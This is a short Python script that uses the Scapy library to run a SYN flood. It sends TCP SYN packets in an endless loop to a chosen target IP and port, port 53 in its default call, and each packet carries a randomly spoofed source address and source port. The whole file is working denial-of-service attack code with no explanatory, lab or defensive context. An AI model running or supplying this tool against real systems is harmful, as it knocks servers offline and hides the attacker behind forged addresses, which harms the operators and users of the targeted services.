import random
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


def syn_flood_attack(attack_ip, attack_port):
    while True:
        ip = str(random.randint(120,150))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254));
        port = random.randint(1,65535)
        ip_real = IP(src=ip, dst=attack_ip)
        tcp_real = TCP(sport=port, dport=attack_port, flags='S')
        packet = ip_real/tcp_real
        send(packet, verbose=0)

if __name__ == '__main__':
    syn_flood_attack("xxx", 53)